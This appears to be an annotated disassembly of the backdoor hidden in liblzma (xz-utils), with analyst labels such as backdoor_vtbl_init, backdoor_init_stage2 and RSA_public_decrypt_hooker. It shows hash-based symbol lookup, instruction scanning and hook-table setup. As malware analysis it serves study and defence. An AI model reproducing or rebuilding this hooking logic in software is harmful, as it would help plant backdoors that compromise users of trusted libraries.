.text.lzma_lz_encoder_memusaga:0000000000002540
.text.lzma_lz_encoder_memusaga:0000000000002540 ; =============== S U B R O U T I N E =======================================
.text.lzma_lz_encoder_memusaga:0000000000002540
.text.lzma_lz_encoder_memusaga:0000000000002540
.text.lzma_lz_encoder_memusaga:0000000000002540 ; __int64 __fastcall sub_2540(_QWORD *, __int64, struct_elf_info *, __int64)
.text.lzma_lz_encoder_memusaga:0000000000002540 sub_2540        proc near               ; CODE XREF: install_entries+22A↓p
.text.lzma_lz_encoder_memusaga:0000000000002540
.text.lzma_lz_encoder_memusaga:0000000000002540 var_B8          = qword ptr -0B8h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_B0          = qword ptr -0B0h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_A8          = qword ptr -0A8h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_A0          = qword ptr -0A0h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_98          = qword ptr -98h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_90          = qword ptr -90h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_88          = qword ptr -88h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_80          = qword ptr -80h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_78          = qword ptr -78h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_6F          = byte ptr -6Fh
.text.lzma_lz_encoder_memusaga:0000000000002540 var_65          = byte ptr -65h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_64          = dword ptr -64h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_58          = dword ptr -58h
.text.lzma_lz_encoder_memusaga:0000000000002540 var_50          = qword ptr -50h
.text.lzma_lz_encoder_memusaga:0000000000002540
.text.lzma_lz_encoder_memusaga:0000000000002540                 push    r15
.text.lzma_lz_encoder_memusaga:0000000000002542                 xor     eax, eax
.text.lzma_lz_encoder_memusaga:0000000000002544                 mov     r15, rcx
.text.lzma_lz_encoder_memusaga:0000000000002547                 push    r14
.text.lzma_lz_encoder_memusaga:0000000000002549                 push    r13
.text.lzma_lz_encoder_memusaga:000000000000254B                 mov     r13, rsi
.text.lzma_lz_encoder_memusaga:000000000000254E                 push    r12
.text.lzma_lz_encoder_memusaga:0000000000002550                 push    rbx
.text.lzma_lz_encoder_memusaga:0000000000002551                 mov     rbx, rdx
.text.lzma_lz_encoder_memusaga:0000000000002554                 sub     rsp, 90h
.text.lzma_lz_encoder_memusaga:000000000000255B                 mov     [rsp+0B8h+var_A0], rdi
.text.lzma_lz_encoder_memusaga:0000000000002560                 mov     edi, 1          ; _QWORD
.text.lzma_lz_encoder_memusaga:0000000000002565                 mov     [rsp+0B8h+var_88], rax
.text.lzma_lz_encoder_memusaga:000000000000256A                 call    get_lzma_allocator ; PIC mode
.text.lzma_lz_encoder_memusaga:000000000000256F                 lea     rsi, [rsp+0B8h+var_88]
.text.lzma_lz_encoder_memusaga:0000000000002574                 mov     rdi, r13
.text.lzma_lz_encoder_memusaga:0000000000002577                 mov     [rax+10h], rbx
.text.lzma_lz_encoder_memusaga:000000000000257B                 mov     [rsp+0B8h+var_B8], rax
.text.lzma_lz_encoder_memusaga:000000000000257F                 call    _Llzma_check_update_0 ; PIC mode
.text.lzma_lz_encoder_memusaga:0000000000002584                 test    rax, rax
.text.lzma_lz_encoder_memusaga:0000000000002587                 jz      short loc_25D6
.text.lzma_lz_encoder_memusaga:0000000000002589                 mov     r14, [rsp+0B8h+var_88]
.text.lzma_lz_encoder_memusaga:000000000000258E                 mov     rsi, [rsp+0B8h+var_B8]
.text.lzma_lz_encoder_memusaga:0000000000002592                 mov     edi, 758h
.text.lzma_lz_encoder_memusaga:0000000000002597                 mov     r12, rax
.text.lzma_lz_encoder_memusaga:000000000000259A                 add     r14, rax
.text.lzma_lz_encoder_memusaga:000000000000259D                 call    lzma_alloc      ; PIC mode
.text.lzma_lz_encoder_memusaga:00000000000025A2                 mov     [r15+70h], rax
.text.lzma_lz_encoder_memusaga:00000000000025A6                 test    rax, rax
.text.lzma_lz_encoder_memusaga:00000000000025A9                 jz      short loc_25B2
.text.lzma_lz_encoder_memusaga:00000000000025AB                 inc     dword ptr [r15+120h]
.text.lzma_lz_encoder_memusaga:00000000000025B2
.text.lzma_lz_encoder_memusaga:00000000000025B2 loc_25B2:                               ; CODE XREF: sub_2540+69↑j
.text.lzma_lz_encoder_memusaga:00000000000025B2                 mov     esi, 228h
.text.lzma_lz_encoder_memusaga:00000000000025B7                 mov     rdi, r13
.text.lzma_lz_encoder_memusaga:00000000000025BA                 call    _Ldelta_decode_part_0 ; PIC mode
.text.lzma_lz_encoder_memusaga:00000000000025BF                 mov     [rsp+0B8h+var_B0], rax
.text.lzma_lz_encoder_memusaga:00000000000025C4                 test    rax, rax
.text.lzma_lz_encoder_memusaga:00000000000025C7                 jnz     short loc_25DD
.text.lzma_lz_encoder_memusaga:00000000000025C9
.text.lzma_lz_encoder_memusaga:00000000000025C9 loc_25C9:                               ; CODE XREF: sub_2540+A8↓j
.text.lzma_lz_encoder_memusaga:00000000000025C9                                         ; sub_2540+AD↓j ...
.text.lzma_lz_encoder_memusaga:00000000000025C9                 mov     rdi, [r15+70h]
.text.lzma_lz_encoder_memusaga:00000000000025CD                 mov     rsi, [rsp+0B8h+var_B8]
.text.lzma_lz_encoder_memusaga:00000000000025D1                 call    lzma_free       ; PIC mode
.text.lzma_lz_encoder_memusaga:00000000000025D6
.text.lzma_lz_encoder_memusaga:00000000000025D6 loc_25D6:                               ; CODE XREF: sub_2540+47↑j
.text.lzma_lz_encoder_memusaga:00000000000025D6                 xor     eax, eax
.text.lzma_lz_encoder_memusaga:00000000000025D8                 jmp     loc_2742
.text.lzma_lz_encoder_memusaga:00000000000025DD ; ---------------------------------------------------------------------------
.text.lzma_lz_encoder_memusaga:00000000000025DD
.text.lzma_lz_encoder_memusaga:00000000000025DD loc_25DD:                               ; CODE XREF: sub_2540+87↑j
.text.lzma_lz_encoder_memusaga:00000000000025DD                 mov     r9, [r13+0]
.text.lzma_lz_encoder_memusaga:00000000000025E1                 add     r9, [r9+18h]
.text.lzma_lz_encoder_memusaga:00000000000025E5                 cmp     r9, r14
.text.lzma_lz_encoder_memusaga:00000000000025E8                 jnb     short loc_25C9
.text.lzma_lz_encoder_memusaga:00000000000025EA                 cmp     r9, r12
.text.lzma_lz_encoder_memusaga:00000000000025ED                 jb      short loc_25C9
.text.lzma_lz_encoder_memusaga:00000000000025EF                 lea     rdi, [rsp+0B8h+var_80]
.text.lzma_lz_encoder_memusaga:00000000000025F4                 mov     ecx, 16h
.text.lzma_lz_encoder_memusaga:00000000000025F9                 mov     esi, 0F8h       ; hash
.text.lzma_lz_encoder_memusaga:00000000000025FE                 mov     [rsp+0B8h+var_90], r9
.text.lzma_lz_encoder_memusaga:0000000000002603                 lea     r13, [r9+200h]
.text.lzma_lz_encoder_memusaga:000000000000260A                 cmp     r14, r13
.text.lzma_lz_encoder_memusaga:000000000000260D                 cmovbe  r13, r14
.text.lzma_lz_encoder_memusaga:0000000000002611                 xor     eax, eax
.text.lzma_lz_encoder_memusaga:0000000000002613                 xor     edx, edx        ; a3
.text.lzma_lz_encoder_memusaga:0000000000002615                 rep stosd
.text.lzma_lz_encoder_memusaga:0000000000002617                 mov     rdi, rbx        ; a1
.text.lzma_lz_encoder_memusaga:000000000000261A                 mov     [rsp+0B8h+var_A8], r13
.text.lzma_lz_encoder_memusaga:000000000000261F                 call    import_lookup_get_str ; PIC mode
.text.lzma_lz_encoder_memusaga:0000000000002624                 lea     rcx, [rsp+0B8h+var_80]
.text.lzma_lz_encoder_memusaga:0000000000002629                 mov     r9, [rsp+0B8h+var_90]
.text.lzma_lz_encoder_memusaga:000000000000262E                 test    rax, rax
.text.lzma_lz_encoder_memusaga:0000000000002631                 mov     [rsp+0B8h+var_98], rcx
.text.lzma_lz_encoder_memusaga:0000000000002636                 jz      short loc_264D
.text.lzma_lz_encoder_memusaga:0000000000002638                 mov     rax, [rax+8]
.text.lzma_lz_encoder_memusaga:000000000000263C                 add     rax, [rbx]
.text.lzma_lz_encoder_memusaga:000000000000263F                 inc     dword ptr [r15+120h]
.text.lzma_lz_encoder_memusaga:0000000000002646                 mov     [r15+0F0h], rax
.text.lzma_lz_encoder_memusaga:000000000000264D
.text.lzma_lz_encoder_memusaga:000000000000264D loc_264D:                               ; CODE XREF: sub_2540+F6↑j
.text.lzma_lz_encoder_memusaga:000000000000264D                 xor     r13d, r13d
.text.lzma_lz_encoder_memusaga:0000000000002650
.text.lzma_lz_encoder_memusaga:0000000000002650 loc_2650:                               ; CODE XREF: sub_2540+1E8↓j
.text.lzma_lz_encoder_memusaga:0000000000002650                                         ; sub_2540+1F0↓j
.text.lzma_lz_encoder_memusaga:0000000000002650                 mov     rax, [rsp+0B8h+var_A8]
.text.lzma_lz_encoder_memusaga:0000000000002655                 cmp     r9, rax
.text.lzma_lz_encoder_memusaga:0000000000002658                 jnb     loc_25C9
.text.lzma_lz_encoder_memusaga:000000000000265E                 mov     rdx, [rsp+0B8h+var_A8]
.text.lzma_lz_encoder_memusaga:0000000000002663                 mov     rdi, [rsp+0B8h+var_98]
.text.lzma_lz_encoder_memusaga:0000000000002668                 mov     rsi, r9
.text.lzma_lz_encoder_memusaga:000000000000266B                 mov     [rsp+0B8h+var_90], r9
.text.lzma_lz_encoder_memusaga:0000000000002670                 call    code_dasm       ; PIC mode
.text.lzma_lz_encoder_memusaga:0000000000002675                 mov     r9, [rsp+0B8h+var_90]
.text.lzma_lz_encoder_memusaga:000000000000267A                 test    eax, eax
.text.lzma_lz_encoder_memusaga:000000000000267C                 jz      loc_272D
.text.lzma_lz_encoder_memusaga:0000000000002682                 mov     eax, [rsp+0B8h+var_58]
.text.lzma_lz_encoder_memusaga:0000000000002686                 mov     rdx, [rsp+0B8h+var_78]
.text.lzma_lz_encoder_memusaga:000000000000268B                 cmp     eax, 10Dh
.text.lzma_lz_encoder_memusaga:0000000000002690                 jnz     short loc_26C9
.text.lzma_lz_encoder_memusaga:0000000000002692                 mov     al, [rsp+0B8h+var_65]
.text.lzma_lz_encoder_memusaga:0000000000002696                 and     eax, 48h
.text.lzma_lz_encoder_memusaga:0000000000002699                 cmp     al, 48h ; 'H'
.text.lzma_lz_encoder_memusaga:000000000000269B                 jnz     loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026A1                 mov     eax, [rsp+0B8h+var_64]
.text.lzma_lz_encoder_memusaga:00000000000026A5                 xor     al, al
.text.lzma_lz_encoder_memusaga:00000000000026A7                 cmp     eax, 5070000h
.text.lzma_lz_encoder_memusaga:00000000000026AC                 jnz     short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026AE                 mov     rax, [rsp+0B8h+var_80]
.text.lzma_lz_encoder_memusaga:00000000000026B3                 add     rax, rdx
.text.lzma_lz_encoder_memusaga:00000000000026B6                 add     rax, [rsp+0B8h+var_50]
.text.lzma_lz_encoder_memusaga:00000000000026BB                 cmp     rax, r12
.text.lzma_lz_encoder_memusaga:00000000000026BE                 jb      short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026C0                 cmp     rax, r14
.text.lzma_lz_encoder_memusaga:00000000000026C3                 cmovb   r13, rax
.text.lzma_lz_encoder_memusaga:00000000000026C7                 jmp     short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026C9 ; ---------------------------------------------------------------------------
.text.lzma_lz_encoder_memusaga:00000000000026C9
.text.lzma_lz_encoder_memusaga:00000000000026C9 loc_26C9:                               ; CODE XREF: sub_2540+150↑j
.text.lzma_lz_encoder_memusaga:00000000000026C9                 test    r13, r13
.text.lzma_lz_encoder_memusaga:00000000000026CC                 jz      short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026CE                 cmp     eax, 17Fh
.text.lzma_lz_encoder_memusaga:00000000000026D3                 jnz     short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026D5                 mov     eax, [rsp+0B8h+var_64]
.text.lzma_lz_encoder_memusaga:00000000000026D9                 xor     al, al
.text.lzma_lz_encoder_memusaga:00000000000026DB                 cmp     eax, 5020000h
.text.lzma_lz_encoder_memusaga:00000000000026E0                 jnz     short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026E2                 test    [rsp+0B8h+var_6F], 1
.text.lzma_lz_encoder_memusaga:00000000000026E7                 jz      short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026E9                 mov     rax, [rsp+0B8h+var_50]
.text.lzma_lz_encoder_memusaga:00000000000026EE                 add     rax, [rsp+0B8h+var_80]
.text.lzma_lz_encoder_memusaga:00000000000026F3                 add     rax, rdx
.text.lzma_lz_encoder_memusaga:00000000000026F6                 cmp     [rsp+0B8h+var_B0], rax
.text.lzma_lz_encoder_memusaga:00000000000026FB                 jnz     short loc_2725
.text.lzma_lz_encoder_memusaga:00000000000026FD                 xor     edx, edx        ; a3
.text.lzma_lz_encoder_memusaga:00000000000026FF                 mov     esi, 0C60h      ; hash
.text.lzma_lz_encoder_memusaga:0000000000002704                 mov     rdi, rbx        ; a1
.text.lzma_lz_encoder_memusaga:0000000000002707                 call    import_lookup_get_str ; PIC mode
.text.lzma_lz_encoder_memusaga:000000000000270C                 test    rax, rax
.text.lzma_lz_encoder_memusaga:000000000000270F                 jz      short loc_2735
.text.lzma_lz_encoder_memusaga:0000000000002711                 mov     rax, [rax+8]
.text.lzma_lz_encoder_memusaga:0000000000002715                 add     rax, [rbx]
.text.lzma_lz_encoder_memusaga:0000000000002718                 mov     [r15+58h], rax
.text.lzma_lz_encoder_memusaga:000000000000271C                 inc     dword ptr [r15+120h]
.text.lzma_lz_encoder_memusaga:0000000000002723                 jmp     short loc_2735
.text.lzma_lz_encoder_memusaga:0000000000002725 ; ---------------------------------------------------------------------------
.text.lzma_lz_encoder_memusaga:0000000000002725
.text.lzma_lz_encoder_memusaga:0000000000002725 loc_2725:                               ; CODE XREF: sub_2540+15B↑j
.text.lzma_lz_encoder_memusaga:0000000000002725                                         ; sub_2540+16C↑j ...
.text.lzma_lz_encoder_memusaga:0000000000002725                 add     r9, rdx
.text.lzma_lz_encoder_memusaga:0000000000002728                 jmp     loc_2650
.text.lzma_lz_encoder_memusaga:000000000000272D ; ---------------------------------------------------------------------------
.text.lzma_lz_encoder_memusaga:000000000000272D
.text.lzma_lz_encoder_memusaga:000000000000272D loc_272D:                               ; CODE XREF: sub_2540+13C↑j
.text.lzma_lz_encoder_memusaga:000000000000272D                 inc     r9
.text.lzma_lz_encoder_memusaga:0000000000002730                 jmp     loc_2650
.text.lzma_lz_encoder_memusaga:0000000000002735 ; ---------------------------------------------------------------------------
.text.lzma_lz_encoder_memusaga:0000000000002735
.text.lzma_lz_encoder_memusaga:0000000000002735 loc_2735:                               ; CODE XREF: sub_2540+1CF↑j
.text.lzma_lz_encoder_memusaga:0000000000002735                                         ; sub_2540+1E3↑j
.text.lzma_lz_encoder_memusaga:0000000000002735                 mov     rax, [rsp+0B8h+var_A0]
.text.lzma_lz_encoder_memusaga:000000000000273A                 mov     [rax], r13
.text.lzma_lz_encoder_memusaga:000000000000273D                 mov     eax, 1
.text.lzma_lz_encoder_memusaga:0000000000002742
.text.lzma_lz_encoder_memusaga:0000000000002742 loc_2742:                               ; CODE XREF: sub_2540+98↑j
.text.lzma_lz_encoder_memusaga:0000000000002742                 add     rsp, 90h
.text.lzma_lz_encoder_memusaga:0000000000002749                 pop     rbx
.text.lzma_lz_encoder_memusaga:000000000000274A                 pop     r12
.text.lzma_lz_encoder_memusaga:000000000000274C                 pop     r13
.text.lzma_lz_encoder_memusaga:000000000000274E                 pop     r14
.text.lzma_lz_encoder_memusaga:0000000000002750                 pop     r15
.text.lzma_lz_encoder_memusaga:0000000000002752                 retn
.text.lzma_lz_encoder_memusaga:0000000000002752 sub_2540        endp
.text.lzma_lz_encoder_memusaga:0000000000002752
.text.lzma_lz_encoder_memusaga:0000000000002752 _text_lzma_lz_encoder_memusaga ends
.text.lzma_lz_encoder_memusaga:0000000000002752
.text.lzma_block_buffer_bound63:0000000000002760 ; ===========================================================================
.text.lzma_block_buffer_bound63:0000000000002760
.text.lzma_block_buffer_bound63:0000000000002760 ; Segment type: Pure code
.text.lzma_block_buffer_bound63:0000000000002760 ; Segment permissions: Read/Execute
.text.lzma_block_buffer_bound63:0000000000002760 _text_lzma_block_buffer_bound63 segment para public 'CODE' use64
.text.lzma_block_buffer_bound63:0000000000002760                 assume cs:_text_lzma_block_buffer_bound63
.text.lzma_block_buffer_bound63:0000000000002760                 ;org 2760h
.text.lzma_block_buffer_bound63:0000000000002760                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_block_buffer_bound63:0000000000002760
.text.lzma_block_buffer_bound63:0000000000002760 ; =============== S U B R O U T I N E =======================================
.text.lzma_block_buffer_bound63:0000000000002760
.text.lzma_block_buffer_bound63:0000000000002760
.text.lzma_block_buffer_bound63:0000000000002760 ; void __fastcall sub_2760(__int64)
.text.lzma_block_buffer_bound63:0000000000002760 sub_2760        proc near               ; CODE XREF: func_name_match+153↓p
.text.lzma_block_buffer_bound63:0000000000002760                                         ; parse_elf_init+23F↓p
.text.lzma_block_buffer_bound63:0000000000002760                 test    rdi, rdi
.text.lzma_block_buffer_bound63:0000000000002763                 jz      short locret_27BB
.text.lzma_block_buffer_bound63:0000000000002765                 mov     rax, [rdi+40h]
.text.lzma_block_buffer_bound63:0000000000002769                 test    rax, rax
.text.lzma_block_buffer_bound63:000000000000276C                 jz      short loc_2782
.text.lzma_block_buffer_bound63:000000000000276E                 mov     edx, [rdi+48h]
.text.lzma_block_buffer_bound63:0000000000002771                 mov     [rax], edx
.text.lzma_block_buffer_bound63:0000000000002773                 mov     rdx, [rdi+0F8h]
.text.lzma_block_buffer_bound63:000000000000277A                 test    rdx, rdx
.text.lzma_block_buffer_bound63:000000000000277D                 jz      short loc_2782
.text.lzma_block_buffer_bound63:000000000000277F                 mov     [rdx], rax
.text.lzma_block_buffer_bound63:0000000000002782
.text.lzma_block_buffer_bound63:0000000000002782 loc_2782:                               ; CODE XREF: sub_2760+C↑j
.text.lzma_block_buffer_bound63:0000000000002782                                         ; sub_2760+1D↑j
.text.lzma_block_buffer_bound63:0000000000002782                 mov     rax, [rdi+50h]
.text.lzma_block_buffer_bound63:0000000000002786                 test    rax, rax
.text.lzma_block_buffer_bound63:0000000000002789                 jz      short loc_2790
.text.lzma_block_buffer_bound63:000000000000278B                 mov     edx, [rdi+58h]
.text.lzma_block_buffer_bound63:000000000000278E                 mov     [rax], edx
.text.lzma_block_buffer_bound63:0000000000002790
.text.lzma_block_buffer_bound63:0000000000002790 loc_2790:                               ; CODE XREF: sub_2760+29↑j
.text.lzma_block_buffer_bound63:0000000000002790                 mov     rax, [rdi+60h]
.text.lzma_block_buffer_bound63:0000000000002794                 test    rax, rax
.text.lzma_block_buffer_bound63:0000000000002797                 jz      short loc_27A0
.text.lzma_block_buffer_bound63:0000000000002799                 mov     dl, [rdi+68h]
.text.lzma_block_buffer_bound63:000000000000279C                 not     edx
.text.lzma_block_buffer_bound63:000000000000279E                 and     [rax], dl
.text.lzma_block_buffer_bound63:00000000000027A0
.text.lzma_block_buffer_bound63:00000000000027A0 loc_27A0:                               ; CODE XREF: sub_2760+37↑j
.text.lzma_block_buffer_bound63:00000000000027A0                 mov     rax, [rdi+78h]
.text.lzma_block_buffer_bound63:00000000000027A4                 test    rax, rax
.text.lzma_block_buffer_bound63:00000000000027A7                 jz      short loc_27AD
.text.lzma_block_buffer_bound63:00000000000027A9                 xor     ecx, ecx
.text.lzma_block_buffer_bound63:00000000000027AB                 mov     [rax], ecx
.text.lzma_block_buffer_bound63:00000000000027AD
.text.lzma_block_buffer_bound63:00000000000027AD loc_27AD:                               ; CODE XREF: sub_2760+47↑j
.text.lzma_block_buffer_bound63:00000000000027AD                 mov     rax, [rdi+70h]
.text.lzma_block_buffer_bound63:00000000000027B1                 test    rax, rax
.text.lzma_block_buffer_bound63:00000000000027B4                 jz      short locret_27BB
.text.lzma_block_buffer_bound63:00000000000027B6                 xor     edx, edx
.text.lzma_block_buffer_bound63:00000000000027B8                 mov     [rax], rdx
.text.lzma_block_buffer_bound63:00000000000027BB
.text.lzma_block_buffer_bound63:00000000000027BB locret_27BB:                            ; CODE XREF: sub_2760+3↑j
.text.lzma_block_buffer_bound63:00000000000027BB                                         ; sub_2760+54↑j
.text.lzma_block_buffer_bound63:00000000000027BB                 retn
.text.lzma_block_buffer_bound63:00000000000027BB sub_2760        endp
.text.lzma_block_buffer_bound63:00000000000027BB
.text.lzma_block_buffer_bound63:00000000000027BB _text_lzma_block_buffer_bound63 ends
.text.lzma_block_buffer_bound63:00000000000027BB
.text.lzma_delta_decoder_inis:00000000000027C0 ; ===========================================================================
.text.lzma_delta_decoder_inis:00000000000027C0
.text.lzma_delta_decoder_inis:00000000000027C0 ; Segment type: Pure code
.text.lzma_delta_decoder_inis:00000000000027C0 ; Segment permissions: Read/Execute
.text.lzma_delta_decoder_inis:00000000000027C0 _text_lzma_delta_decoder_inis segment para public 'CODE' use64
.text.lzma_delta_decoder_inis:00000000000027C0                 assume cs:_text_lzma_delta_decoder_inis
.text.lzma_delta_decoder_inis:00000000000027C0                 ;org 27C0h
.text.lzma_delta_decoder_inis:00000000000027C0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_delta_decoder_inis:00000000000027C0
.text.lzma_delta_decoder_inis:00000000000027C0 ; =============== S U B R O U T I N E =======================================
.text.lzma_delta_decoder_inis:00000000000027C0
.text.lzma_delta_decoder_inis:00000000000027C0
.text.lzma_delta_decoder_inis:00000000000027C0 ; __int64 __fastcall backdoor_vtbl_init(struc_vtbl *a1)
.text.lzma_delta_decoder_inis:00000000000027C0                 public backdoor_vtbl_init
.text.lzma_delta_decoder_inis:00000000000027C0 backdoor_vtbl_init proc near            ; CODE XREF: backdoor_init_stage2+6E↓p
.text.lzma_delta_decoder_inis:00000000000027C0                                         ; backdoor_init_stage2+7F↓p
.text.lzma_delta_decoder_inis:00000000000027C0                                         ; DATA XREF: ...
.text.lzma_delta_decoder_inis:00000000000027C0                 endbr64
.text.lzma_delta_decoder_inis:00000000000027C4                 mov     eax, 5
.text.lzma_delta_decoder_inis:00000000000027C9                 test    rdi, rdi
.text.lzma_delta_decoder_inis:00000000000027CC                 jz      short locret_2831
.text.lzma_delta_decoder_inis:00000000000027CE                 lea     rax, _Lfilter_options_0
.text.lzma_delta_decoder_inis:00000000000027D5                 mov     [rdi+38h], rax
.text.lzma_delta_decoder_inis:00000000000027D9                 xor     eax, eax
.text.lzma_delta_decoder_inis:00000000000027DB                 cmp     qword ptr [rdi+30h], 0
.text.lzma_delta_decoder_inis:00000000000027E0                 jnz     short locret_2831
.text.lzma_delta_decoder_inis:00000000000027E2                 lea     rax, func_name_match
.text.lzma_delta_decoder_inis:00000000000027E9                 mov     qword ptr [rdi+68h], 4
.text.lzma_delta_decoder_inis:00000000000027F1                 mov     [rdi+40h], rax
.text.lzma_delta_decoder_inis:00000000000027F5                 mov     rax, offset _Llzma_index_prealloc_0
.text.lzma_delta_decoder_inis:00000000000027FC                 mov     [rdi+48h], rax
.text.lzma_delta_decoder_inis:0000000000002800                 mov     rax, offset RSA_public_decrypt_hooker
.text.lzma_delta_decoder_inis:0000000000002807                 mov     [rdi+50h], rax
.text.lzma_delta_decoder_inis:000000000000280B                 mov     rax, offset _Llzma12_mode_map_part_1
.text.lzma_delta_decoder_inis:0000000000002812                 mov     [rdi+58h], rax
.text.lzma_delta_decoder_inis:0000000000002816                 mov     rax, offset _Lfile_info_decode_0
.text.lzma_delta_decoder_inis:000000000000281D                 mov     [rdi+70h], rax
.text.lzma_delta_decoder_inis:0000000000002821                 mov     rax, offset _Lbt_skip_func_part_0
.text.lzma_delta_decoder_inis:0000000000002828                 mov     [rdi+78h], rax
.text.lzma_delta_decoder_inis:000000000000282C                 mov     eax, 65h ; 'e'
.text.lzma_delta_decoder_inis:0000000000002831
.text.lzma_delta_decoder_inis:0000000000002831 locret_2831:                            ; CODE XREF: backdoor_vtbl_init+C↑j
.text.lzma_delta_decoder_inis:0000000000002831                                         ; backdoor_vtbl_init+20↑j
.text.lzma_delta_decoder_inis:0000000000002831                 retn
.text.lzma_delta_decoder_inis:0000000000002831 backdoor_vtbl_init endp
.text.lzma_delta_decoder_inis:0000000000002831
.text.lzma_delta_decoder_inis:0000000000002831 _text_lzma_delta_decoder_inis ends
.text.lzma_delta_decoder_inis:0000000000002831
.text.lzma_delta_props_decodd:0000000000002840 ; ===========================================================================
.text.lzma_delta_props_decodd:0000000000002840
.text.lzma_delta_props_decodd:0000000000002840 ; Segment type: Pure code
.text.lzma_delta_props_decodd:0000000000002840 ; Segment permissions: Read/Execute
.text.lzma_delta_props_decodd:0000000000002840 _text_lzma_delta_props_decodd segment para public 'CODE' use64
.text.lzma_delta_props_decodd:0000000000002840                 assume cs:_text_lzma_delta_props_decodd
.text.lzma_delta_props_decodd:0000000000002840                 ;org 2840h
.text.lzma_delta_props_decodd:0000000000002840                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_delta_props_decodd:0000000000002840
.text.lzma_delta_props_decodd:0000000000002840 ; =============== S U B R O U T I N E =======================================
.text.lzma_delta_props_decodd:0000000000002840
.text.lzma_delta_props_decodd:0000000000002840
.text.lzma_delta_props_decodd:0000000000002840 ; __int64 __fastcall Llzma_delta_props_decode_part_0(__int64 (__fastcall **)(__int64 a1, int a2, __int64 a3))
.text.lzma_delta_props_decodd:0000000000002840 _Llzma_delta_props_decode_part_0 proc near
.text.lzma_delta_props_decodd:0000000000002840                                         ; DATA XREF: sub_2880+2E↓o
.text.lzma_delta_props_decodd:0000000000002840                 endbr64
.text.lzma_delta_props_decodd:0000000000002844                 mov     eax, 5
.text.lzma_delta_props_decodd:0000000000002849                 test    rdi, rdi
.text.lzma_delta_props_decodd:000000000000284C                 jz      short locret_2870
.text.lzma_delta_props_decodd:000000000000284E                 mov     rax, offset _Llzma_code_part_1
.text.lzma_delta_props_decodd:0000000000002855                 mov     [rdi], rax
.text.lzma_delta_props_decodd:0000000000002858                 mov     rax, offset _Llzma_index_memusage_part_0
.text.lzma_delta_props_decodd:000000000000285F                 mov     [rdi+8], rax
.text.lzma_delta_props_decodd:0000000000002863                 mov     rax, offset global_ctx
.text.lzma_delta_props_decodd:000000000000286A                 mov     [rdi+10h], rax
.text.lzma_delta_props_decodd:000000000000286E                 xor     eax, eax
.text.lzma_delta_props_decodd:0000000000002870
.text.lzma_delta_props_decodd:0000000000002870 locret_2870:                            ; CODE XREF: _Llzma_delta_props_decode_part_0+C↑j
.text.lzma_delta_props_decodd:0000000000002870                 retn
.text.lzma_delta_props_decodd:0000000000002870 _Llzma_delta_props_decode_part_0 endp
.text.lzma_delta_props_decodd:0000000000002870
.text.lzma_delta_props_decodd:0000000000002870 _text_lzma_delta_props_decodd ends
.text.lzma_delta_props_decodd:0000000000002870
.text.microlzma_decoder_inia:0000000000002880 ; ===========================================================================
.text.microlzma_decoder_inia:0000000000002880
.text.microlzma_decoder_inia:0000000000002880 ; Segment type: Pure code
.text.microlzma_decoder_inia:0000000000002880 ; Segment permissions: Read/Execute
.text.microlzma_decoder_inia:0000000000002880 _text_microlzma_decoder_inia segment para public 'CODE' use64
.text.microlzma_decoder_inia:0000000000002880                 assume cs:_text_microlzma_decoder_inia
.text.microlzma_decoder_inia:0000000000002880                 ;org 2880h
.text.microlzma_decoder_inia:0000000000002880                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.microlzma_decoder_inia:0000000000002880
.text.microlzma_decoder_inia:0000000000002880 ; =============== S U B R O U T I N E =======================================
.text.microlzma_decoder_inia:0000000000002880
.text.microlzma_decoder_inia:0000000000002880
.text.microlzma_decoder_inia:0000000000002880 ; __int64 __fastcall sub_2880(struc_2880 *a1)
.text.microlzma_decoder_inia:0000000000002880 sub_2880        proc near               ; CODE XREF: parse_elf_init+1435↓p
.text.microlzma_decoder_inia:0000000000002880                 cmp     dword ptr [rdi+120h], 1Dh
.text.microlzma_decoder_inia:0000000000002887                 jnz     short loc_28B9
.text.microlzma_decoder_inia:0000000000002889                 cmp     qword ptr [rdi+18h], 0
.text.microlzma_decoder_inia:000000000000288E                 mov     eax, 1
.text.microlzma_decoder_inia:0000000000002893                 jnz     short locret_28BB
.text.microlzma_decoder_inia:0000000000002895                 cmp     qword ptr [rdi+20h], 0
.text.microlzma_decoder_inia:000000000000289A                 jnz     short locret_28BB
.text.microlzma_decoder_inia:000000000000289C                 cmp     qword ptr [rdi+28h], 0
.text.microlzma_decoder_inia:00000000000028A1                 jnz     short locret_28BB
.text.microlzma_decoder_inia:00000000000028A3                 lea     rax, backdoor_init_stage2
.text.microlzma_decoder_inia:00000000000028AA                 mov     [rdi+18h], rax
.text.microlzma_decoder_inia:00000000000028AE                 lea     rax, _Llzma_delta_props_decode_part_0
.text.microlzma_decoder_inia:00000000000028B5                 mov     [rdi+28h], rax
.text.microlzma_decoder_inia:00000000000028B9
.text.microlzma_decoder_inia:00000000000028B9 loc_28B9:                               ; CODE XREF: sub_2880+7↑j
.text.microlzma_decoder_inia:00000000000028B9                 xor     eax, eax
.text.microlzma_decoder_inia:00000000000028BB
.text.microlzma_decoder_inia:00000000000028BB locret_28BB:                            ; CODE XREF: sub_2880+13↑j
.text.microlzma_decoder_inia:00000000000028BB                                         ; sub_2880+1A↑j ...
.text.microlzma_decoder_inia:00000000000028BB                 retn
.text.microlzma_decoder_inia:00000000000028BB sub_2880        endp
.text.microlzma_decoder_inia:00000000000028BB
